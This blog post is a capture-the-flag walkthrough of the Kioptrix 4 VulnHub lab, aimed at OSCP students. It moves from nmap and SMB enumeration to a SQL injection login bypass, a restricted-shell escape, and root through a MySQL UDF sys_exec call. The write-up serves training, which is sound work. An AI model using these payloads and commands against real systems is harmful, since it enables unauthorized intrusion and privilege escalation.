---
layout: single
title: "VulnHub - Kioptrix 4"
header:
  overlay_image: kioptrix-banner.jpg
  caption: "[__VulnHub__](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)"
related: true
comments: true
---

Welcome back to the Kioptrix VM Series!

These write-ups were created in aiding those starting the PWK Course, or who are training for the OSCP Certificate. The Kioptrix VM's were created to closely resemble those in the PWK Course. To read more about this, or if you haven't already read my first post for Kioptrix 1 - then I suggest you do so. That post can be found [here](https://jhalon.github.io/vulnhub-kioptrix1/).

 Alright - let's get to pwning Kioptrix 4!

## Description:
Again a long delay between VMs, but that cannot be helped. Work, family must come first. Blogs and hobbies are pushed down the list. These things aren’t as easy to make as one may think. Time and some planning must be put into these challenges, to make sure that:

1. It’s possible to remotely compromise the machine

2. Stays within the target audience of this site

3. Must be “realistic” (well kinda…)

Should serve as a refresher for me. Be it PHP or MySQL usage etc. Stuff I haven’t done in a while.

I also had lots of troubles exporting this one. So please take the time to read my comments at the end of this post.

Keeping in the spirit of things, this challenge is a bit different than the others but remains in the realm of the easy. Repeating myself I know, but things must always be made clear: These VMs are for the beginner. It’s a place to start.

I’d would love to code some small custom application for people to exploit. But I’m an administrator not a coder. It would take too much time to learn/code such an application. Not saying I’ll never try doing one, but I wouldn’t hold my breath. If someone wants more difficult challenges, I’m sure the Inter-tubes holds them somewhere. Or you can always enroll in Offsec’s PWK course. *shameless plug

## The Hack:
As always, when we do these VulnHub VM's we always want to start off by running `netdiscover` so we can see what devices are on our network. If you're running the Kioptrix VM in VirtualBox or VMWare - it should come up in the vendor name list, and that will be your Kioptrix VM.

```console
 Currently scanning: 192.168.4.0/16   |   Screen View: Unique Hosts            
                                                                               
 8 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 480               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     00:26:f2:0c:b3:82      1      60  NETGEAR                     
 192.168.1.9     d8:cb:8a:bf:d0:59      1      60  Micro-Star INTL CO., LTD.   
 192.168.1.10    18:03:73:1c:5d:6a      1      60  Dell Inc.                   
 192.168.1.14    00:0c:29:8b:97:53      1      60  VMware, Inc.
```

Okay, so the IP of 192.168.1.14 will be our Kioptrix Machine. From here, we can run an nmap scan to check for any open ports/running services.

```console
root@kali:~# nmap -sS -A -n 192.168.1.14

Starting Nmap 7.40 ( https://nmap.org ) at 2016-12-29 02:28 CST
Nmap scan report for 192.168.1.14
Host is up (0.0011s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:8B:97:53 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.16 - 2.6.28
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -5h59m57s, deviation: 0s, median: -5h59m57s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2016-12-28T21:28:27-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   1.12 ms 192.168.1.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.75 seconds
```

From the initial scans and the default nmap script scan, we can see that NetBIOS on TCP/139 and NetBIOS over TCP/IP on TCP/445 is open. This is good because we can enumerate SMB for any public facing shares, as well as usernames. 

We also see that TCP/80 is open and running and Apache HTTPD Web Server - which we can also use for exploitation purposes.

But before we dig into the website - let's start by enumerating usernames through NetBIOS using nmap.

```console
root@kali:~# nmap -sC --script=smb-enum-users 192.168.1.14

Starting Nmap 7.40 ( https://nmap.org ) at 2016-12-29 02:37 CST
Nmap scan report for 192.168.1.14
Host is up (0.00096s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:8B:97:53 (VMware)

Host script results:
| smb-enum-users: 
|   KIOPTRIX4\john (RID: 3002)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\loneferret (RID: 3000)
|     Full name:   loneferret,,,
|     Flags:       Normal user account
|   KIOPTRIX4\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account
|   KIOPTRIX4\robert (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account
|   KIOPTRIX4\root (RID: 1000)
|     Full name:   root
|_    Flags:       Normal user account


Nmap done: 1 IP address (1 host up) scanned in 2.85 seconds
```

Awesome! We got 5 usernames from our enumeration step. Let's save this someplace, as we will need them for later!

Once we got that done, our next step should be to try and connect to the SMB shares on Kioptrix. This allows us to see if we have any anonymous access, and to check if there are any public facing shares.

We can accomplish this step by using [smbclient](https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html)!

```console
root@kali:~# smbclient -L 192.168.1.14
WARNING: The "syslog" option is deprecated
Enter root's password: 
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]

	Server               Comment
	---------            -------
	---Redacted--              
	KIOPTRIX4            Kioptrix4 server (Samba, Ubuntu)

	Workgroup            Master
	---------            -------
	WORKGROUP            ---Redacted--
```

So we were able to login anonymously - but unfortunately there are no public shares that we can connect to.

__NOTE__: Don't mind the "__redacted__" in the output, smbclient somehow picked up my labs domain name too...

At this point some of you might be wondering as to what the __IPC$__ share is. So let me go ahead and quickly explain it before we move on.

The IPC$ share is also known as a null session connection. By using this session, Windows/Linux (in this case) lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.

This special share exists to allow for subsequent named pipe connections to the server. The server's named pipes are created by built-in operating system components and by any applications or services that are installed on the system. When the named pipe is being created, the process specifies the security that is associated with the pipe, and then makes sure that access is only granted to the specified users or groups.

Okay - now that you know more about IPC shares, let's move on!

Since we also know that TCP/80 is running Apache HTTPD - let's go ahead and connect to the website to see what we got.

<a href="/images/kiop4-1.png"><img src="/images/kiop4-1.png"></a>

It seems like we need to login... so let's go ahead and attempt a [SQL Injection](https://www.owasp.org/index.php/SQL_Injection)!

Let's start by putting a comma `'` in the Username and Password fields.

<a href="/images/kiop4-2.png"><img src="/images/kiop4-2.png"></a>

Lovely, we found a SQL Injection! Let's go back and grab one of the usernames from the SMB Enumeration, and let's see if we can't break into their account using this exploit.

I decided to go with __john__ for this one. So in the Username field type in `john` and in the password field type in `1' or '1'='1`.

Now, if I guessed correctly, the backend SQL Query should look like the following:

`SELECT * FROM users where username='john' and password='1' or '1'='1'`

This basically tells SQL that if username is john, and the password is TRUE, then log in.

<a href="/images/kiop4-3.png"><img src="/images/kiop4-3.png"></a>

Well look at that, I was right! And, it also seems like we got John's password! 

From here, let's SSH into the Kioptrix Machine with John's credentials and see if we can't get root!

```console
oot@kali:~# ssh john@192.168.1.14
john@192.168.1.14's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$

john:~$ cd ..
*** forbidden path -> "/home/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
john:~$ cd /
*** forbidden path -> "/"
*** Kicked out

Connection to 192.168.1.14 closed.
```

Huh... well that is odd! It seems we are limited in the commands we can use. Let's SSH back in and use the `?` option to see more information.

```console
root@kali:~# ssh john@192.168.1.14
john@192.168.1.14's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
john:~$ lpath
Allowed:
 /home/john
```

So we are limited in the commands we can use, thus it seems like we are in a [Restricted Shell](https://en.wikipedia.org/wiki/Restricted_shell). 

SANS had a very good post on [Escaping Restricted Shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells) that I suggest you read up on!

Alright - let's break out of this shell!

```console
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ 
```

Bingo! Okay, now that we have more access, let's run [ps](http://linuxcommand.org/man_pages/ps1.html) and see what running processes we have.

```console
john@Kioptrix4:~$ ps -ef | grep root
root         1     0  0 21:27 ?        00:00:01 /sbin/init
root         2     0  0 21:27 ?        00:00:00 [kthreadd]
root         3     2  0 21:27 ?        00:00:00 [migration/0]
root         4     2  0 21:27 ?        00:00:00 [ksoftirqd/0]
root         5     2  0 21:27 ?        00:00:00 [watchdog/0]
root         6     2  0 21:27 ?        00:00:00 [events/0]
root         7     2  0 21:27 ?        00:00:00 [khelper]
root        41     2  0 21:27 ?        00:00:00 [kblockd/0]
root        44     2  0 21:27 ?        00:00:00 [kacpid]
root        45     2  0 21:27 ?        00:00:00 [kacpi_notify]
root       173     2  0 21:27 ?        00:00:00 [kseriod]
root       212     2  0 21:27 ?        00:00:00 [pdflush]
root       213     2  0 21:27 ?        00:00:00 [pdflush]
root       214     2  0 21:27 ?        00:00:00 [kswapd0]
root       256     2  0 21:27 ?        00:00:00 [aio/0]
root      1476     2  0 21:27 ?        00:00:00 [ata/0]
root      1479     2  0 21:27 ?        00:00:00 [ata_aux]
root      1487     2  0 21:27 ?        00:00:00 [scsi_eh_0]
root      1492     2  0 21:27 ?        00:00:00 [scsi_eh_1]
root      1505     2  0 21:27 ?        00:00:00 [ksuspend_usbd]
root      1510     2  0 21:27 ?        00:00:00 [khubd]
root      2369     2  0 21:27 ?        00:00:00 [scsi_eh_2]
root      2608     2  0 21:27 ?        00:00:00 [kjournald]
root      2776     1  0 21:27 ?        00:00:00 /sbin/udevd --daemon
root      3088     2  0 21:27 ?        00:00:00 [kgameportd]
root      3222     2  0 21:27 ?        00:00:00 [kpsmoused]
root      4513     1  0 21:27 tty4     00:00:00 /sbin/getty 38400 tty4
root      4514     1  0 21:27 tty5     00:00:00 /sbin/getty 38400 tty5
root      4518     1  0 21:27 tty2     00:00:00 /sbin/getty 38400 tty2
root      4519     1  0 21:27 tty3     00:00:00 /sbin/getty 38400 tty3
root      4525     1  0 21:27 tty6     00:00:00 /sbin/getty 38400 tty6
root      4581     1  0 21:27 ?        00:00:00 /bin/dd bs 1 if /proc/kmsg of /v
root      4602     1  0 21:27 ?        00:00:00 /usr/sbin/sshd
root      4658     1  0 21:27 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      4700  4658  0 21:27 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr
root      4702  4658  0 21:27 ?        00:00:00 logger -p daemon.err -t mysqld_s
root      4775     1  0 21:27 ?        00:00:00 /usr/sbin/nmbd -D
root      4777     1  0 21:27 ?        00:00:00 /usr/sbin/smbd -D
root      4791  4777  0 21:27 ?        00:00:00 /usr/sbin/smbd -D
root      4792     1  0 21:27 ?        00:00:00 /usr/sbin/winbindd
root      4823  4792  0 21:27 ?        00:00:00 /usr/sbin/winbindd
root      4824     1  0 21:27 ?        00:00:00 /usr/sbin/cron
root      4846     1  0 21:27 ?        00:00:00 /usr/sbin/apache2 -k start
root      4903     1  0 21:27 tty1     00:00:00 /sbin/getty 38400 tty1
root      4915  4792  0 21:28 ?        00:00:00 /usr/sbin/winbindd
root      4916  4792  0 21:28 ?        00:00:00 /usr/sbin/winbindd
root      5042  4602  0 23:27 ?        00:00:00 sshd: john [priv]
john      5175  5051  0 23:37 pts/0    00:00:00 grep root
```

MySQL is running... and since we have access to the Machine via SSH, let's see if we can't find the Username and Password of the database in the __/var/www__ directory.

```console
john@Kioptrix4:~$ cd /var/www 
john@Kioptrix4:/var/www$ ls
checklogin.php  images     john               logout.php  robert
database.sql    index.php  login_success.php  member.php
john@Kioptrix4:/var/www$ cat checklogin.php 
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```

No Password? So much for strict security...

Now, you might be thinking to yourself - "Jack! Why would I care that MySQL Is running? Shouldn't I be looking for a way to escalate privileges?"

Ahhh and that my dear reader is exactly what we are doing! See, now that we have "root" access to MySQL, we can attempt command execution using a MySQL UDF or [User Defined Function](https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html).

What does that mean? Simple... using the MySQL UDF we can escalate our privilege to root! You can read more about MySQL UDF [here](http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)!

First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let's check.

```console
john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so 
-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so
```

Ahhh don't you love the smell of root in the morning! ;)

Great, from here let's login to MySQL with our newfound credentials and run a usermod command with __sys\_exec__ to give john admin privileges!

```console
john@Kioptrix4:/var/www$ mysql -h localhost -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 105
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.08 sec)
```

Did it work? I don't know, let's find out and see!

```console
john@Kioptrix4:/var/www$ sudo su
[sudo] password for john: 
root@Kioptrix4:/var/www# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix4:/var/www# whoami
root
```

## Closing:

And there we have it folks! We just rooted Kioptrix 4!

This level was a tad harder than level 3 since it required for you to think a little "outside" the box and utilize MySQL for your exploitation of privileges. This just goes to show - don't leave any stone unturned! At the same time we got to use SQL Injection again and it allowed us to refresh our memory on how this exploit worked.

As always guys - when you get stuck, refer to Google first - after some digging you'll find what you need, just don't give up and... __Try Harder__!

That's all for now - thanks for reading!
